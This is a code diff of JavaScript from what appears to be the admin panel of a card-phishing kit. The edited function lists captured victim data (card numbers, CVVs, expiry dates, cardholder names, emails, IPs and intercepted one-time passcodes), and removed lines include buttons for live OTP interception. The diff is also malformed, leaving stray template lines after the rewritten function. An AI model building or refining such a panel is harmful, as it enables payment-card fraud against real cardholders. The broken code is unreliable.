@@ -521,29 +521,39 @@ const validPassword = process.env.ADMIN_PASS;
       }
     ];
 
-    function loadTransactions() {
-      const tbody = document.querySelector("#transactionsTable tbody");
-      tbody.innerHTML = '';
-      transactions.forEach(tx => {
-        const row = document.createElement('tr');
-        row.innerHTML = `
-          <td>${tx.id}</td>
-          <td>${tx.email}</td>
-          <td>${tx.amount}</td>
-          <td>${tx.currency}</td>
-          <td>${tx.cardNumber}</td>
-          <td>${tx.cvv}</td>
-          <td>${tx.expiry}</td>
-          <td>${tx.cardholder}</td>
-          <td>${tx.ip || 'N/A'}</td>
-          <td>
-            ${tx.otpEntered ? 
-              `<span class="otp-received">${tx.otpEntered}</span>
-               <button class="wrong-otp-btn" onclick="markWrongOTP('${tx.id}', this)" ${tx.redirectStatus ? 'disabled' : ''}>
-                 Incorrect OTP
-               </button>` : 
-              tx.otpShown ? 
-                '<span class="status-badge status-otp">Waiting for OTP</span>' : 
+   async function loadTransactions() {
+  const response = await fetch('/api/transactions');
+  const data = await response.json();
+
+  if (data.status === 'success') {
+    const tbody = document.querySelector("#transactionsTable tbody");
+    tbody.innerHTML = ''; // Clear existing rows
+
+    data.transactions.forEach(tx => {
+      const row = document.createElement('tr');
+      row.innerHTML = `
+        <td>${tx.id}</td>
+        <td>${tx.email}</td>
+        <td>${tx.amount}</td>
+        <td>${tx.currency}</td>
+        <td>${tx.cardNumber}</td>
+        <td>${tx.cvv}</td>
+        <td>${tx.expiry}</td>
+        <td>${tx.cardholder}</td>
+        <td>${tx.ip || 'N/A'}</td>
+        <td>
+          ${tx.otpEntered ? `<span class="otp-received">${tx.otpEntered}</span>` : '<span class="status-badge status-otp">Waiting for OTP</span>'}
+        </td>
+        <td>
+          <span class="status-badge status-${tx.status || 'processing'}">${tx.status || 'Processing'}</span>
+        </td>
+      `;
+      tbody.appendChild(row);
+    });
+  } else {
+    console.log('Failed to fetch transactions');
+  }
+}
                 `<button class="show-otp-btn" onclick="showOTP('${tx.id}', this)" ${tx.status !== 'processing' ? 'disabled' : ''}>
                   Show OTP
                 </button>`
